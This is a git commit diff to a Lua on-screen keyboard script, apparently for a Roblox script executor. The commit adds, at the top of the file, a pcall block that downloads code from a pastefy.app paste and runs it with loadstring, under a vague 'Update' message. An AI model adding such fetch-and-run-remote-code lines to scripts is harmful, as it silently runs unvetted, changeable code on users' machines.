a3d9ef749bdff4aca09b9f26839772cc0a69d8dc
barbarianTopG <134774093+barbarianTopG@users.noreply.github.com>
2025-10-04 12:51:26 +1000

    Update KilobyteKD.lua

--- Keyboards/KilobyteKD.lua
+++ Keyboards/KilobyteKD.lua
@@ -1,3 +1,9 @@
+pcall(function()
+    if not shared.FunctionPatchesForTrashExecutor == true then
+        loadstring(game:HttpGet("https://pastefy.app/TL0PGJ2Z/raw"))()
+        shared.FunctionPatchesForTrashExecutor = true
+    end
+end)
 local Players = game:GetService("Players")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local TweenService = game:GetService("TweenService")
